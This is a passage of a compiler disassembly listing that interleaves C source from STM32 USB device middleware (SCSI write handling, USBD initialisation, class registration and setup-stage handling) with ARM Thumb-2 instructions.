 800afb0:	47a0      	blx	r4
 800afb2:	4603      	mov	r3, r0
 800afb4:	2b00      	cmp	r3, #0
 800afb6:	da08      	bge.n	800afca <SCSI_ProcessWrite+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, WRITE_FAULT);
 800afb8:	78f9      	ldrb	r1, [r7, #3]
 800afba:	2303      	movs	r3, #3
 800afbc:	2204      	movs	r2, #4
 800afbe:	6878      	ldr	r0, [r7, #4]
 800afc0:	f7ff fa78 	bl	800a4b4 <SCSI_SenseCode>
    return -1;
 800afc4:	f04f 33ff 	mov.w	r3, #4294967295
 800afc8:	e053      	b.n	800b072 <SCSI_ProcessWrite+0x146>
  }

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800afca:	68fb      	ldr	r3, [r7, #12]
 800afcc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800afd0:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800afd2:	68fb      	ldr	r3, [r7, #12]
 800afd4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800afd8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800afdc:	4619      	mov	r1, r3
 800afde:	68bb      	ldr	r3, [r7, #8]
 800afe0:	fbb3 f3f1 	udiv	r3, r3, r1
 800afe4:	4413      	add	r3, r2
 800afe6:	68fa      	ldr	r2, [r7, #12]
 800afe8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800afec:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800afee:	68fb      	ldr	r3, [r7, #12]
 800aff0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aff4:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800aff6:	68fb      	ldr	r3, [r7, #12]
 800aff8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800affc:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800b000:	4619      	mov	r1, r3
 800b002:	68bb      	ldr	r3, [r7, #8]
 800b004:	fbb3 f3f1 	udiv	r3, r3, r1
 800b008:	1ad3      	subs	r3, r2, r3
 800b00a:	68fa      	ldr	r2, [r7, #12]
 800b00c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800b010:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 12 : Ho = Do */
  hmsc->csw.dDataResidue -= len;
 800b012:	68fb      	ldr	r3, [r7, #12]
 800b014:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800b018:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800b01a:	68bb      	ldr	r3, [r7, #8]
 800b01c:	1ad3      	subs	r3, r2, r3
 800b01e:	68fa      	ldr	r2, [r7, #12]
 800b020:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800b024:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800b026:	68fb      	ldr	r3, [r7, #12]
 800b028:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800b02c:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800b02e:	2b00      	cmp	r3, #0
 800b030:	d104      	bne.n	800b03c <SCSI_ProcessWrite+0x110>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800b032:	2100      	movs	r1, #0
 800b034:	6878      	ldr	r0, [r7, #4]
 800b036:	f7fe fc53 	bl	80098e0 <MSC_BOT_SendCSW>
 800b03a:	e019      	b.n	800b070 <SCSI_ProcessWrite+0x144>
  }
  else
  {
    len = MIN((hmsc->scsi_blk_len * hmsc->scsi_blk_size), MSC_MEDIA_PACKET);
 800b03c:	68fb      	ldr	r3, [r7, #12]
 800b03e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800b042:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800b044:	68fa      	ldr	r2, [r7, #12]
 800b046:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800b04a:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800b04e:	fb02 f303 	mul.w	r3, r2, r3
 800b052:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800b056:	bf28      	it	cs
 800b058:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800b05c:	60bb      	str	r3, [r7, #8]

    /* Prepare EP to Receive next packet */
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800b05e:	4b07      	ldr	r3, [pc, #28]	; (800b07c <SCSI_ProcessWrite+0x150>)
 800b060:	7819      	ldrb	r1, [r3, #0]
 800b062:	68fb      	ldr	r3, [r7, #12]
 800b064:	f103 0210 	add.w	r2, r3, #16
 800b068:	68bb      	ldr	r3, [r7, #8]
 800b06a:	6878      	ldr	r0, [r7, #4]
 800b06c:	f002 f84c 	bl	800d108 <USBD_LL_PrepareReceive>
  }

  return 0;
 800b070:	2300      	movs	r3, #0
}
 800b072:	4618      	mov	r0, r3
 800b074:	3714      	adds	r7, #20
 800b076:	46bd      	mov	sp, r7
 800b078:	bd90      	pop	{r4, r7, pc}
 800b07a:	bf00      	nop
 800b07c:	2000010b 	.word	0x2000010b

0800b080 <SCSI_UpdateBotData>:
  * @param  length: Data length
  * @retval status
  */
static int8_t SCSI_UpdateBotData(USBD_MSC_BOT_HandleTypeDef *hmsc,
                                 uint8_t *pBuff, uint16_t length)
{
 800b080:	b480      	push	{r7}
 800b082:	b087      	sub	sp, #28
 800b084:	af00      	add	r7, sp, #0
 800b086:	60f8      	str	r0, [r7, #12]
 800b088:	60b9      	str	r1, [r7, #8]
 800b08a:	4613      	mov	r3, r2
 800b08c:	80fb      	strh	r3, [r7, #6]
  uint16_t len = length;
 800b08e:	88fb      	ldrh	r3, [r7, #6]
 800b090:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800b092:	68fb      	ldr	r3, [r7, #12]
 800b094:	2b00      	cmp	r3, #0
 800b096:	d102      	bne.n	800b09e <SCSI_UpdateBotData+0x1e>
  {
    return -1;
 800b098:	f04f 33ff 	mov.w	r3, #4294967295
 800b09c:	e013      	b.n	800b0c6 <SCSI_UpdateBotData+0x46>
  }

  hmsc->bot_data_length = len;
 800b09e:	8afa      	ldrh	r2, [r7, #22]
 800b0a0:	68fb      	ldr	r3, [r7, #12]
 800b0a2:	60da      	str	r2, [r3, #12]

  while (len != 0U)
 800b0a4:	e00b      	b.n	800b0be <SCSI_UpdateBotData+0x3e>
  {
    len--;
 800b0a6:	8afb      	ldrh	r3, [r7, #22]
 800b0a8:	3b01      	subs	r3, #1
 800b0aa:	82fb      	strh	r3, [r7, #22]
    hmsc->bot_data[len] = pBuff[len];
 800b0ac:	8afb      	ldrh	r3, [r7, #22]
 800b0ae:	68ba      	ldr	r2, [r7, #8]
 800b0b0:	441a      	add	r2, r3
 800b0b2:	8afb      	ldrh	r3, [r7, #22]
 800b0b4:	7811      	ldrb	r1, [r2, #0]
 800b0b6:	68fa      	ldr	r2, [r7, #12]
 800b0b8:	4413      	add	r3, r2
 800b0ba:	460a      	mov	r2, r1
 800b0bc:	741a      	strb	r2, [r3, #16]
  while (len != 0U)
 800b0be:	8afb      	ldrh	r3, [r7, #22]
 800b0c0:	2b00      	cmp	r3, #0
 800b0c2:	d1f0      	bne.n	800b0a6 <SCSI_UpdateBotData+0x26>
  }

  return 0;
 800b0c4:	2300      	movs	r3, #0
}
 800b0c6:	4618      	mov	r0, r3
 800b0c8:	371c      	adds	r7, #28
 800b0ca:	46bd      	mov	sp, r7
 800b0cc:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b0d0:	4770      	bx	lr

0800b0d2 <USBD_Init>:
  * @param  id: Low level core index
  * @retval None
  */
USBD_StatusTypeDef USBD_Init(USBD_HandleTypeDef *pdev,
                             USBD_DescriptorsTypeDef *pdesc, uint8_t id)
{
 800b0d2:	b580      	push	{r7, lr}
 800b0d4:	b086      	sub	sp, #24
 800b0d6:	af00      	add	r7, sp, #0
 800b0d8:	60f8      	str	r0, [r7, #12]
 800b0da:	60b9      	str	r1, [r7, #8]
 800b0dc:	4613      	mov	r3, r2
 800b0de:	71fb      	strb	r3, [r7, #7]
  USBD_StatusTypeDef ret;

  /* Check whether the USB Host handle is valid */
  if (pdev == NULL)
 800b0e0:	68fb      	ldr	r3, [r7, #12]
 800b0e2:	2b00      	cmp	r3, #0
 800b0e4:	d101      	bne.n	800b0ea <USBD_Init+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Device handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800b0e6:	2303      	movs	r3, #3
 800b0e8:	e01f      	b.n	800b12a <USBD_Init+0x58>
    pdev->NumClasses = 0;
    pdev->classId = 0;
  }
#else
  /* Unlink previous class*/
  pdev->pClass[0] = NULL;
 800b0ea:	68fb      	ldr	r3, [r7, #12]
 800b0ec:	2200      	movs	r2, #0
 800b0ee:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  pdev->pUserData[0] = NULL;
 800b0f2:	68fb      	ldr	r3, [r7, #12]
 800b0f4:	2200      	movs	r2, #0
 800b0f6:	f8c3 22c4 	str.w	r2, [r3, #708]	; 0x2c4
#endif /* USE_USBD_COMPOSITE */

  pdev->pConfDesc = NULL;
 800b0fa:	68fb      	ldr	r3, [r7, #12]
 800b0fc:	2200      	movs	r2, #0
 800b0fe:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0

  /* Assign USBD Descriptors */
  if (pdesc != NULL)
 800b102:	68bb      	ldr	r3, [r7, #8]
 800b104:	2b00      	cmp	r3, #0
 800b106:	d003      	beq.n	800b110 <USBD_Init+0x3e>
  {
    pdev->pDesc = pdesc;
 800b108:	68fb      	ldr	r3, [r7, #12]
 800b10a:	68ba      	ldr	r2, [r7, #8]
 800b10c:	f8c3 22b4 	str.w	r2, [r3, #692]	; 0x2b4
  }

  /* Set Device initial State */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b110:	68fb      	ldr	r3, [r7, #12]
 800b112:	2201      	movs	r2, #1
 800b114:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->id = id;
 800b118:	68fb      	ldr	r3, [r7, #12]
 800b11a:	79fa      	ldrb	r2, [r7, #7]
 800b11c:	701a      	strb	r2, [r3, #0]

  /* Initialize low level driver */
  ret = USBD_LL_Init(pdev);
 800b11e:	68f8      	ldr	r0, [r7, #12]
 800b120:	f001 fdb6 	bl	800cc90 <USBD_LL_Init>
 800b124:	4603      	mov	r3, r0
 800b126:	75fb      	strb	r3, [r7, #23]

  return ret;
 800b128:	7dfb      	ldrb	r3, [r7, #23]
}
 800b12a:	4618      	mov	r0, r3
 800b12c:	3718      	adds	r7, #24
 800b12e:	46bd      	mov	sp, r7
 800b130:	bd80      	pop	{r7, pc}

0800b132 <USBD_RegisterClass>:
  * @param  pDevice : Device Handle
  * @param  pclass: Class handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_RegisterClass(USBD_HandleTypeDef *pdev, USBD_ClassTypeDef *pclass)
{
 800b132:	b580      	push	{r7, lr}
 800b134:	b084      	sub	sp, #16
 800b136:	af00      	add	r7, sp, #0
 800b138:	6078      	str	r0, [r7, #4]
 800b13a:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800b13c:	2300      	movs	r3, #0
 800b13e:	81fb      	strh	r3, [r7, #14]

  if (pclass == NULL)
 800b140:	683b      	ldr	r3, [r7, #0]
 800b142:	2b00      	cmp	r3, #0
 800b144:	d101      	bne.n	800b14a <USBD_RegisterClass+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Class handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800b146:	2303      	movs	r3, #3
 800b148:	e025      	b.n	800b196 <USBD_RegisterClass+0x64>
  }

  /* link the class to the USB Device handle */
  pdev->pClass[0] = pclass;
 800b14a:	687b      	ldr	r3, [r7, #4]
 800b14c:	683a      	ldr	r2, [r7, #0]
 800b14e:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  if (pdev->pClass[pdev->classId]->GetHSConfigDescriptor != NULL)
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetHSConfigDescriptor(&len);
  }
#else /* Default USE_USB_FS */
  if (pdev->pClass[pdev->classId]->GetFSConfigDescriptor != NULL)
 800b152:	687b      	ldr	r3, [r7, #4]
 800b154:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b158:	687b      	ldr	r3, [r7, #4]
 800b15a:	32ae      	adds	r2, #174	; 0xae
 800b15c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b160:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800b162:	2b00      	cmp	r3, #0
 800b164:	d00f      	beq.n	800b186 <USBD_RegisterClass+0x54>
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetFSConfigDescriptor(&len);
 800b166:	687b      	ldr	r3, [r7, #4]
 800b168:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b16c:	687b      	ldr	r3, [r7, #4]
 800b16e:	32ae      	adds	r2, #174	; 0xae
 800b170:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b174:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800b176:	f107 020e 	add.w	r2, r7, #14
 800b17a:	4610      	mov	r0, r2
 800b17c:	4798      	blx	r3
 800b17e:	4602      	mov	r2, r0
 800b180:	687b      	ldr	r3, [r7, #4]
 800b182:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0
  }
#endif /* USE_USB_FS */

  /* Increment the NumClasses */
  pdev->NumClasses ++;
 800b186:	687b      	ldr	r3, [r7, #4]
 800b188:	f8d3 32d8 	ldr.w	r3, [r3, #728]	; 0x2d8
 800b18c:	1c5a      	adds	r2, r3, #1
 800b18e:	687b      	ldr	r3, [r7, #4]
 800b190:	f8c3 22d8 	str.w	r2, [r3, #728]	; 0x2d8

  return USBD_OK;
 800b194:	2300      	movs	r3, #0
}
 800b196:	4618      	mov	r0, r3
 800b198:	3710      	adds	r7, #16
 800b19a:	46bd      	mov	sp, r7
 800b19c:	bd80      	pop	{r7, pc}

0800b19e <USBD_Start>:
  *         Start the USB Device Core.
  * @param  pdev: Device Handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_Start(USBD_HandleTypeDef *pdev)
{
 800b19e:	b580      	push	{r7, lr}
 800b1a0:	b082      	sub	sp, #8
 800b1a2:	af00      	add	r7, sp, #0
 800b1a4:	6078      	str	r0, [r7, #4]
#ifdef USE_USBD_COMPOSITE
  pdev->classId = 0U;
#endif /* USE_USBD_COMPOSITE */

  /* Start the low level driver  */
  return USBD_LL_Start(pdev);
 800b1a6:	6878      	ldr	r0, [r7, #4]
 800b1a8:	f001 fdca 	bl	800cd40 <USBD_LL_Start>
 800b1ac:	4603      	mov	r3, r0
}
 800b1ae:	4618      	mov	r0, r3
 800b1b0:	3708      	adds	r7, #8
 800b1b2:	46bd      	mov	sp, r7
 800b1b4:	bd80      	pop	{r7, pc}

0800b1b6 <USBD_RunTestMode>:
  *         Launch test mode process
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_RunTestMode(USBD_HandleTypeDef *pdev)
{
 800b1b6:	b480      	push	{r7}
 800b1b8:	b083      	sub	sp, #12
 800b1ba:	af00      	add	r7, sp, #0
 800b1bc:	6078      	str	r0, [r7, #4]
  return ret;
#else
  /* Prevent unused argument compilation warning */
  UNUSED(pdev);

  return USBD_OK;
 800b1be:	2300      	movs	r3, #0
#endif /* USBD_HS_TESTMODE_ENABLE */
}
 800b1c0:	4618      	mov	r0, r3
 800b1c2:	370c      	adds	r7, #12
 800b1c4:	46bd      	mov	sp, r7
 800b1c6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b1ca:	4770      	bx	lr

0800b1cc <USBD_SetClassConfig>:
  * @param  cfgidx: configuration index
  * @retval status
  */

USBD_StatusTypeDef USBD_SetClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800b1cc:	b580      	push	{r7, lr}
 800b1ce:	b084      	sub	sp, #16
 800b1d0:	af00      	add	r7, sp, #0
 800b1d2:	6078      	str	r0, [r7, #4]
 800b1d4:	460b      	mov	r3, r1
 800b1d6:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800b1d8:	2300      	movs	r3, #0
 800b1da:	73fb      	strb	r3, [r7, #15]
        }
      }
    }
  }
#else
  if (pdev->pClass[0] != NULL)
 800b1dc:	687b      	ldr	r3, [r7, #4]
 800b1de:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b1e2:	2b00      	cmp	r3, #0
 800b1e4:	d009      	beq.n	800b1fa <USBD_SetClassConfig+0x2e>
  {
    /* Set configuration and Start the Class */
    ret = (USBD_StatusTypeDef)pdev->pClass[0]->Init(pdev, cfgidx);
 800b1e6:	687b      	ldr	r3, [r7, #4]
 800b1e8:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b1ec:	681b      	ldr	r3, [r3, #0]
 800b1ee:	78fa      	ldrb	r2, [r7, #3]
 800b1f0:	4611      	mov	r1, r2
 800b1f2:	6878      	ldr	r0, [r7, #4]
 800b1f4:	4798      	blx	r3
 800b1f6:	4603      	mov	r3, r0
 800b1f8:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800b1fa:	7bfb      	ldrb	r3, [r7, #15]
}
 800b1fc:	4618      	mov	r0, r3
 800b1fe:	3710      	adds	r7, #16
 800b200:	46bd      	mov	sp, r7
 800b202:	bd80      	pop	{r7, pc}

0800b204 <USBD_ClrClassConfig>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status: USBD_StatusTypeDef
  */
USBD_StatusTypeDef USBD_ClrClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800b204:	b580      	push	{r7, lr}
 800b206:	b084      	sub	sp, #16
 800b208:	af00      	add	r7, sp, #0
 800b20a:	6078      	str	r0, [r7, #4]
 800b20c:	460b      	mov	r3, r1
 800b20e:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800b210:	2300      	movs	r3, #0
 800b212:	73fb      	strb	r3, [r7, #15]
      }
    }
  }
#else
  /* Clear configuration  and De-initialize the Class process */
  if (pdev->pClass[0]->DeInit(pdev, cfgidx) != 0U)
 800b214:	687b      	ldr	r3, [r7, #4]
 800b216:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b21a:	685b      	ldr	r3, [r3, #4]
 800b21c:	78fa      	ldrb	r2, [r7, #3]
 800b21e:	4611      	mov	r1, r2
 800b220:	6878      	ldr	r0, [r7, #4]
 800b222:	4798      	blx	r3
 800b224:	4603      	mov	r3, r0
 800b226:	2b00      	cmp	r3, #0
 800b228:	d001      	beq.n	800b22e <USBD_ClrClassConfig+0x2a>
  {
    ret = USBD_FAIL;
 800b22a:	2303      	movs	r3, #3
 800b22c:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800b22e:	7bfb      	ldrb	r3, [r7, #15]
}
 800b230:	4618      	mov	r0, r3
 800b232:	3710      	adds	r7, #16
 800b234:	46bd      	mov	sp, r7
 800b236:	bd80      	pop	{r7, pc}

0800b238 <USBD_LL_SetupStage>:
  *         Handle the setup stage
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetupStage(USBD_HandleTypeDef *pdev, uint8_t *psetup)
{
 800b238:	b580      	push	{r7, lr}
 800b23a:	b084      	sub	sp, #16
 800b23c:	af00      	add	r7, sp, #0
 800b23e:	6078      	str	r0, [r7, #4]
 800b240:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret;

  USBD_ParseSetupRequest(&pdev->request, psetup);
 800b242:	687b      	ldr	r3, [r7, #4]
 800b244:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b248:	6839      	ldr	r1, [r7, #0]
 800b24a:	4618      	mov	r0, r3
 800b24c:	f001 f8a7 	bl	800c39e <USBD_ParseSetupRequest>

  pdev->ep0_state = USBD_EP0_SETUP;
 800b250:	687b      	ldr	r3, [r7, #4]
 800b252:	2201      	movs	r2, #1
 800b254:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  pdev->ep0_data_len = pdev->request.wLength;
 800b258:	687b      	ldr	r3, [r7, #4]
 800b25a:	f8b3 32b0 	ldrh.w	r3, [r3, #688]	; 0x2b0
 800b25e:	461a      	mov	r2, r3
 800b260:	687b      	ldr	r3, [r7, #4]
 800b262:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

  switch (pdev->request.bmRequest & 0x1FU)
 800b266:	687b      	ldr	r3, [r7, #4]
 800b268:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b26c:	f003 031f 	and.w	r3, r3, #31
 800b270:	2b02      	cmp	r3, #2
 800b272:	d01a      	beq.n	800b2aa <USBD_LL_SetupStage+0x72>
 800b274:	2b02      	cmp	r3, #2
 800b276:	d822      	bhi.n	800b2be <USBD_LL_SetupStage+0x86>
 800b278:	2b00      	cmp	r3, #0
 800b27a:	d002      	beq.n	800b282 <USBD_LL_SetupStage+0x4a>
 800b27c:	2b01      	cmp	r3, #1
 800b27e:	d00a      	beq.n	800b296 <USBD_LL_SetupStage+0x5e>
 800b280:	e01d      	b.n	800b2be <USBD_LL_SetupStage+0x86>
  {
    case USB_REQ_RECIPIENT_DEVICE:
      ret = USBD_StdDevReq(pdev, &pdev->request);
 800b282:	687b      	ldr	r3, [r7, #4]
 800b284:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b288:	4619      	mov	r1, r3
 800b28a:	6878      	ldr	r0, [r7, #4]
 800b28c:	f000 fad4 	bl	800b838 <USBD_StdDevReq>
 800b290:	4603      	mov	r3, r0
 800b292:	73fb      	strb	r3, [r7, #15]
      break;
 800b294:	e020      	b.n	800b2d8 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_INTERFACE:
      ret = USBD_StdItfReq(pdev, &pdev->request);
 800b296:	687b      	ldr	r3, [r7, #4]
 800b298:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b29c:	4619      	mov	r1, r3
 800b29e:	6878      	ldr	r0, [r7, #4]
 800b2a0:	f000 fb3c 	bl	800b91c <USBD_StdItfReq>
 800b2a4:	4603      	mov	r3, r0
 800b2a6:	73fb      	strb	r3, [r7, #15]
      break;
 800b2a8:	e016      	b.n	800b2d8 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_ENDPOINT:
      ret = USBD_StdEPReq(pdev, &pdev->request);
 800b2aa:	687b      	ldr	r3, [r7, #4]
 800b2ac:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b2b0:	4619      	mov	r1, r3
 800b2b2:	6878      	ldr	r0, [r7, #4]
 800b2b4:	f000 fb9e 	bl	800b9f4 <USBD_StdEPReq>
 800b2b8:	4603      	mov	r3, r0
 800b2ba:	73fb      	strb	r3, [r7, #15]
      break;
 800b2bc:	e00c      	b.n	800b2d8 <USBD_LL_SetupStage+0xa0>

    default:
      ret = USBD_LL_StallEP(pdev, (pdev->request.bmRequest & 0x80U));
 800b2be:	687b      	ldr	r3, [r7, #4]
 800b2c0:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b2c4:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 800b2c8:	b2db      	uxtb	r3, r3
 800b2ca:	4619      	mov	r1, r3
 800b2cc:	6878      	ldr	r0, [r7, #4]
 800b2ce:	f001 fe13 	bl	800cef8 <USBD_LL_StallEP>
 800b2d2:	4603      	mov	r3, r0
 800b2d4:	73fb      	strb	r3, [r7, #15]
      break;
 800b2d6:	bf00      	nop
  }

  return ret;
 800b2d8:	7bfb      	ldrb	r3, [r7, #15]
}
 800b2da:	4618      	mov	r0, r3
 800b2dc:	3710      	adds	r7, #16
 800b2de:	46bd      	mov	sp, r7
 800b2e0:	bd80      	pop	{r7, pc}

0800b2e2 <USBD_LL_DataOutStage>:
  * @param  pdata: data pointer
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataOutStage(USBD_HandleTypeDef *pdev,
                                        uint8_t epnum, uint8_t *pdata)
{
 800b2e2:	b580      	push	{r7, lr}
 800b2e4:	b086      	sub	sp, #24
 800b2e6:	af00      	add	r7, sp, #0
 800b2e8:	60f8      	str	r0, [r7, #12]
 800b2ea:	460b      	mov	r3, r1
 800b2ec:	607a      	str	r2, [r7, #4]
 800b2ee:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret = USBD_OK;
 800b2f0:	2300      	movs	r3, #0
 800b2f2:	75fb      	strb	r3, [r7, #23]
  uint8_t idx;

  if (epnum == 0U)
 800b2f4:	7afb      	ldrb	r3, [r7, #11]
 800b2f6:	2b00      	cmp	r3, #0
 800b2f8:	d16e      	bne.n	800b3d8 <USBD_LL_DataOutStage+0xf6>
  {
    pep = &pdev->ep_out[0];
 800b2fa:	68fb      	ldr	r3, [r7, #12]
 800b2fc:	f503 73aa 	add.w	r3, r3, #340	; 0x154
 800b300:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_OUT)
 800b302:	68fb      	ldr	r3, [r7, #12]
 800b304:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b308:	2b03      	cmp	r3, #3
 800b30a:	f040 8098 	bne.w	800b43e <USBD_LL_DataOutStage+0x15c>
    {
      if (pep->rem_length > pep->maxpacket)
 800b30e:	693b      	ldr	r3, [r7, #16]
 800b310:	689a      	ldr	r2, [r3, #8]
 800b312:	693b      	ldr	r3, [r7, #16]
 800b314:	68db      	ldr	r3, [r3, #12]
 800b316:	429a      	cmp	r2, r3
 800b318:	d913      	bls.n	800b342 <USBD_LL_DataOutStage+0x60>
      {
        pep->rem_length -= pep->maxpacket;
 800b31a:	693b      	ldr	r3, [r7, #16]
 800b31c:	689a      	ldr	r2, [r3, #8]
 800b31e:	693b      	ldr	r3, [r7, #16]
 800b320:	68db      	ldr	r3, [r3, #12]
 800b322:	1ad2      	subs	r2, r2, r3
 800b324:	693b      	ldr	r3, [r7, #16]
 800b326:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueRx(pdev, pdata, MIN(pep->rem_length, pep->maxpacket));
 800b328:	693b      	ldr	r3, [r7, #16]
 800b32a:	68da      	ldr	r2, [r3, #12]
 800b32c:	693b      	ldr	r3, [r7, #16]
 800b32e:	689b      	ldr	r3, [r3, #8]
 800b330:	4293      	cmp	r3, r2
 800b332:	bf28      	it	cs
 800b334:	4613      	movcs	r3, r2
 800b336:	461a      	mov	r2, r3
 800b338:	6879      	ldr	r1, [r7, #4]
 800b33a:	68f8      	ldr	r0, [r7, #12]
 800b33c:	f001 f923 	bl	800c586 <USBD_CtlContinueRx>
 800b340:	e07d      	b.n	800b43e <USBD_LL_DataOutStage+0x15c>
      }
      else
      {
        /* Find the class ID relative to the current request */
        switch (pdev->request.bmRequest & 0x1FU)
 800b342:	68fb      	ldr	r3, [r7, #12]
 800b344:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b348:	f003 031f 	and.w	r3, r3, #31
 800b34c:	2b02      	cmp	r3, #2
 800b34e:	d014      	beq.n	800b37a <USBD_LL_DataOutStage+0x98>
 800b350:	2b02      	cmp	r3, #2
 800b352:	d81d      	bhi.n	800b390 <USBD_LL_DataOutStage+0xae>
 800b354:	2b00      	cmp	r3, #0
 800b356:	d002      	beq.n	800b35e <USBD_LL_DataOutStage+0x7c>
 800b358:	2b01      	cmp	r3, #1
 800b35a:	d003      	beq.n	800b364 <USBD_LL_DataOutStage+0x82>
 800b35c:	e018      	b.n	800b390 <USBD_LL_DataOutStage+0xae>
        {
          case USB_REQ_RECIPIENT_DEVICE:
            /* Device requests must be managed by the first instantiated class
               (or duplicated by all classes for simplicity) */
            idx = 0U;
 800b35e:	2300      	movs	r3, #0
 800b360:	75bb      	strb	r3, [r7, #22]
            break;
 800b362:	e018      	b.n	800b396 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_INTERFACE:
            idx = USBD_CoreFindIF(pdev, LOBYTE(pdev->request.wIndex));
 800b364:	68fb      	ldr	r3, [r7, #12]
 800b366:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b36a:	b2db      	uxtb	r3, r3
 800b36c:	4619      	mov	r1, r3
 800b36e:	68f8      	ldr	r0, [r7, #12]
 800b370:	f000 f9d2 	bl	800b718 <USBD_CoreFindIF>
 800b374:	4603      	mov	r3, r0
 800b376:	75bb      	strb	r3, [r7, #22]
            break;
 800b378:	e00d      	b.n	800b396 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_ENDPOINT:
            idx = USBD_CoreFindEP(pdev, LOBYTE(pdev->request.wIndex));
 800b37a:	68fb      	ldr	r3, [r7, #12]
 800b37c:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b380:	b2db      	uxtb	r3, r3
 800b382:	4619      	mov	r1, r3
 800b384:	68f8      	ldr	r0, [r7, #12]
 800b386:	f000 f9d4 	bl	800b732 <USBD_CoreFindEP>
 800b38a:	4603      	mov	r3, r0
 800b38c:	75bb      	strb	r3, [r7, #22]
            break;
